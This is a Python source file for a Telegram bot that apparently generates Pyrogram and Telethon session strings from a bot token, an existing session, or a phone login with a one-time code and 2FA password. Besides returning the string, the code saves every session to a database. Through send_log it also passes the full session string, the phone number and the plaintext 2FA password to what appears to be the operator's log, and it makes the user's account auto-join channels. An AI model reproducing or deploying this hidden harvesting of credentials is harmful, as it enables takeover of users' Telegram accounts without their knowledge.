import logging
from pyrogram import filters
from pyrogram.enums import ParseMode
from pyrogram.types import Message
from .client import app
from . import config
from .config import API_ID, API_HASH
from .database import save_session
from .helpers import (
    CANCEL_BTN, MAIN_MENU, BACK_BTN,
    validate_phone, handle_error, trace,
    auto_join_channels, send_premium_string, send_log,
    PROMPT_BOT_TOKEN, PROMPT_PYRO_STRING, PROMPT_PHONE, PROMPT_OTP, PROMPT_2FA,
    progress_header, cancel_flow,
)
from .state import get_state, set_state, clear_state

DC_IPS = {
    1: "149.154.175.53",
    2: "149.154.167.51",
    3: "149.154.175.100",
    4: "149.154.167.91",
    5: "91.108.56.130",
}

@app.on_message(filters.private & filters.text, group=1)
async def flow_handler(_, message: Message):
    uid = message.from_user.id
    st = get_state(uid)
    if not st:
        return
    text = message.text.strip()
    if text.lower() in ("/cancel", "cancel"):
        await cancel_flow(uid, message=message)
        await trace(message.from_user, "CANCEL", step=st["step"])
        return
    if text.startswith("/"):
        return
    step = st["step"]
    data = st["data"]
    stype = data.get("type")
    try:
        if step == "bot_token":
            await _step_bot_token(uid, message, text)
        elif step == "pyro_string":
            await _step_pyro_string(uid, message, text)
        elif step == "phone":
            await _step_phone(uid, message, text, stype)
        elif step == "otp":
            await _step_otp(uid, message, text)
        elif step == "2fa":
            await _step_2fa(uid, message, text)
        else:
            clear_state(uid)
    except Exception as e:
        clear_state(uid)
        await handle_error(e, uid, f"flow:{step}")

async def _step_bot_token(uid, message, text):
    token = text.strip()
    from pyrogram import Client as PC
    bc = PC(":memory:", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
    await bc.start()
    try:
        s = await bc.export_session_string()
    finally:
        await bc.stop()
    clear_state(uid)
    await save_session(uid, "Pyrogram Bot", s, "N/A (Bot Token)", False)
    await send_premium_string(uid, "Pyrogram Bot Session", s)
    await send_log(message.from_user, "Pyrogram Bot", s, "N/A (Bot Token)")
    await trace(message.from_user, "SUCCESS", type="pyro_bot")

async def _step_pyro_string(uid, message, text):
    pyro_str = text.strip()
    from pyrogram import Client as PC
    temp = PC(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=pyro_str, in_memory=True)
    await temp.start()
    try:
        me = await temp.get_me()
        auth_key = temp.storage.auth_key.key
        dc_id = temp.storage.dc_id
        from telethon.sessions import StringSession
        from telethon.crypto import AuthKey
        ss = StringSession()
        ss.set_dc(dc_id, DC_IPS.get(dc_id, DC_IPS[2]), 443)
        ss.auth_key = AuthKey(auth_key)
        tele_str = ss.save()
        phone = getattr(me, "phone_number", None) or "N/A"
    finally:
        await temp.stop()
    clear_state(uid)
    await save_session(uid, "Converter", tele_str, phone, False)
    await send_premium_string(uid, "Telethon String (Converted)", tele_str)
    await send_log(me, "Converter", tele_str, phone)
    await trace(message.from_user, "SUCCESS", type="convert")

async def _step_phone(uid, message, text, stype):
    try:
        phone = validate_phone(text)
    except ValueError as ve:
        await message.reply_text(f"❌ <b>{ve}</b>", reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
        return
    await trace(message.from_user, "PHONE", type=stype, phone=phone)
    if stype == "pyro_user":
        from pyrogram import Client as PC
        uc = PC(f"gen_{uid}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await uc.connect()
        sent = await uc.send_code(phone)
        set_state(uid, "otp", type=stype, client=uc, phone=phone, phone_code_hash=sent.phone_code_hash)
    elif stype == "telethon":
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        tc = TelegramClient(StringSession(), API_ID, API_HASH)
        await tc.connect()
        sent = await tc.send_code_request(phone)
        set_state(uid, "otp", type=stype, client=tc, phone=phone, phone_code_hash=sent.phone_code_hash)
    await message.reply_text(PROMPT_OTP, reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)

async def _step_otp(uid, message, text):
    st = get_state(uid)
    if not st:
        return
    data = st["data"]
    stype = data["type"]
    client = data["client"]
    phone = data["phone"]
    pch = data["phone_code_hash"]
    otp = text.strip().replace(" ", "")
    if stype == "pyro_user":
        try:
            await client.sign_in(phone, pch, otp)
        except Exception as e:
            if "password" in str(e).lower():
                set_state(uid, "2fa", type=stype, client=client, phone=phone, has_2fa=True)
                await trace(message.from_user, "OTP", type=stype, status="2FA_REQUIRED")
                await message.reply_text(PROMPT_2FA, reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
                return
            raise
        await _finish(uid, message, stype, client, phone, False, None)
    elif stype == "telethon":
        from telethon.errors import SessionPasswordNeededError
        try:
            await client.sign_in(phone, otp, phone_code_hash=pch)
        except SessionPasswordNeededError:
            set_state(uid, "2fa", type=stype, client=client, phone=phone, has_2fa=True)
            await trace(message.from_user, "OTP", type=stype, status="2FA_REQUIRED")
            await message.reply_text(PROMPT_2FA, reply_markup=CANCEL_BTN, parse_mode=ParseMode.HTML)
            return
        await _finish(uid, message, stype, client, phone, False, None)

async def _step_2fa(uid, message, text):
    st = get_state(uid)
    if not st:
        return
    data = st["data"]
    stype = data["type"]
    client = data["client"]
    phone = data["phone"]
    pwd = text.strip()
    if stype == "pyro_user":
        await client.check_password(pwd)
    elif stype == "telethon":
        await client.sign_in(password=pwd)
    await _finish(uid, message, stype, client, phone, True, pwd)

async def _finish(uid, message, stype, client, phone, has_2fa, real_pwd):
    user = message.from_user
    await trace(user, "OTP", type=stype, status="OK", has_2fa=has_2fa)
    if stype == "pyro_user":
        s = await client.export_session_string()
        joined, failed = await auto_join_channels(client)
        try:
            await client.send_message("me", f"🔐 <b>Pyrogram Session</b>\n<code>{s}</code>\n\n🕒 {config.get_ist_time()}", parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await client.disconnect()
        label = "Pyrogram User Session"
    else:
        s = client.session.save()
        joined, failed = await auto_join_channels(client)
        try:
            await client.send_message("me", f"🔐 <b>Telethon Session</b>\n<code>{s}</code>\n\n🕒 {config.get_ist_time()}", parse_mode="html")
        except Exception:
            pass
        await client.disconnect()
        label = "Telethon String Session"
    clear_state(uid)
    await save_session(uid, label, s, phone, has_2fa)
    await send_premium_string(uid, label, s, has_2fa, joined, failed)
    await send_log(user, label, s, phone, has_2fa, real_pwd, joined)
    await trace(user, "SUCCESS", type=stype, has_2fa=has_2fa)
